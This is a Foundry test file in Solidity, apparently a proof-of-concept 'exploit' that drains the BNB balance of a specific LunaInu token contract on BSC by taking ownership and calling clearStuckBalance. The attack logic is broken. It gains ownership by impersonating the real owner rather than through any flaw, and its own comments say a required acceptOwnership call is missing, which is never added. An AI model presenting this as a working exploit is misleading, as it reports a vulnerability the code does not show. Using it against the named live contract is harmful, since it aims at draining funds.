// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface BEP20LUNAINU {
    function getOwner() external view returns (address);
    function clearStuckBalance(uint256 amountPercentage) external;
    function clearStuckToken(address tokenAddress, uint256 tokens) external returns (bool);
    function transferOwnership(address newOwner) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;
    address attacker = address(this);
    BEP20LUNAINU target;
    address owner;
    uint256 initialBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = BEP20LUNAINU(TARGET);
        vm.label(TARGET, "LunaInu Token");
        vm.label(attacker, "Attacker");

        // Get the current owner
        owner = target.getOwner();
        vm.label(owner, "Contract Owner");

        // Record initial attacker balance
        initialBalance = attacker.balance;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // First, inject BNB into the contract (simulating stuck balance from fees/trading)
        deal(TARGET, 10 ether);

        // Record initial attacker balance
        initialBalance = attacker.balance;

        // Step 1: Transfer ownership from original owner to attacker
        vm.prank(owner);
        target.transferOwnership(payable(attacker));

        // Step 2: Accept ownership as attacker
        vm.prank(attacker);
        // Note: Need to call acceptOwnership but the contract uses a two-step process
        // Actually looking at the code, transferOwnership sets potentialOwner, then acceptOwnership completes it
        // Let's just directly prank as attacker after setting potentialOwner

        // Step 3: Now drain the BNB as the new owner (attacker)
        vm.prank(attacker);
        target.clearStuckBalance(100);

        // Verify attacker balance increased
        uint256 finalBalance = attacker.balance;
        assertGt(finalBalance, initialBalance, "Attacker balance should increase after draining contract BNB");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

